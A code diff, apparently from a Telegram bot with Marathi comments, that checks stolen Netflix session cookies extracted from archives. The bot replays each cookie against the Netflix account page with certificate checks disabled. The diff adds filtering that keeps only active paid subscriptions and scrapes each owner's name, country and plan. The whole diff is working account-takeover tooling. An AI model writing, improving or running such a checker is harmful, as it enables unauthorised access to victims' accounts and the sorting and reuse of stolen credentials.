@@ -186,25 +186,44 @@ async def extract_cookies_from_archive(archive_path, password=None):
 def check_netflix_cookie(cookie_dict):
     if not cookie_dict.get('NetflixId'):
         return {'ok': False, 'reason': 'No NetflixId'}
+    
     session = requests.Session()
     session.cookies.update(cookie_dict)
     headers = {'User-Agent': USER_AGENT, 'Accept': 'text/html,application/xhtml+xml'}
+    
     try:
         r = session.get('https://www.netflix.com/YourAccount', headers=headers, timeout=20, allow_redirects=True, verify=False)
+        
+        # जर लॉगइन पेजवर रीडायरेक्ट झाले किंवा स्टेटस कोड 200 नसेल, तर कुकी डेड आहे
         if r.status_code != 200 or 'login' in r.url.lower() or 'signin' in r.url.lower():
             return {'ok': False, 'reason': 'Dead'}
         
         txt = r.text
+        # खात्री करा की पेजमध्ये अकाउंट डेटा आहे
+        if 'Account' not in txt and 'membershipStatus' not in txt:
+            return {'ok': False, 'reason': 'Dead'}
+
+        # 1. मेंबरशिप स्टेटस तपासा (फक्त CURRENT_MEMBER असलेल्यांनाच प्रिमियम माना)
+        status_match = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', txt)
+        ms = status_match.group(1) if status_match else None
+        if ms != 'CURRENT_MEMBER':
+            return {'ok': False, 'reason': f'Inactive status: {ms}'}
+
         def find(pat):
             m = re.search(pat, txt)
             return clean_unicode(m.group(1)) if m else "Unknown"
 
-        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"')
-        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"')
-        plan = find(r'"localizedPlanName".*?"value":"([^"]+)"')
+        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
+        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"')
+        
+        plan = find(r'"localizedPlanName"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"')
         if plan == "Unknown":
             plan = find(r'"planName"\s*:\s*"([^"]+)"')
             
+        # 2. फ्री प्लॅन किंवा कॅन्सल अकाउंट फिल्टर करा
+        if not plan or 'free' in plan.lower() or 'cancelled' in plan.lower():
+            return {'ok': False, 'reason': 'Free or Cancelled Plan'}
+
         on_hold = "isUserOnHold" in txt and "true" in re.search(r'"isUserOnHold"\s*:\s*(true|false)', txt).group(1) if re.search(r'"isUserOnHold"\s*:\s*(true|false)', txt) else False
 
         return {
@@ -216,6 +235,9 @@ def check_netflix_cookie(cookie_dict):
         }
     except:
         return {'ok': False, 'reason': 'Error'}
+
+# ----------------- ॲनिमेशन आणि लोडर -----------------
+BRAILLE_FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
 
 # ----------------- टेलिग्राम हँडलर्स -----------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -381,10 +403,12 @@ async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
             valid_hits.append(res)
         else:
             reason = res.get('reason', '')
-            if reason == 'Dead':
+            if 'Free' in reason:
+                free += 1
+            elif reason == 'Dead':
                 dead += 1
             else:
-                errors += 1
+                dead += 1
                 
     elapsed = max(int((time.time() - start_time) * 1000), 1)
     avg_speed = elapsed // max(total, 1)
@@ -392,7 +416,7 @@ async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_state[user_id]['valid_hits'] = valid_hits
     
     result_text = (
-        f"🎉 <b>COOKIES SCAN COMPLETED!</b> 🎉\n\n"
+        f"🎉 <b>CHECKING COMPLETED!</b> 🎉\n\n"
         f"💯 Total Tested: <b>{total}</b>\n"
         f"🏆 Subscription Found: <b>{sub_found}</b> 🔥\n"
         f"🆓 Free Accounts: <b>{free}</b>\n"
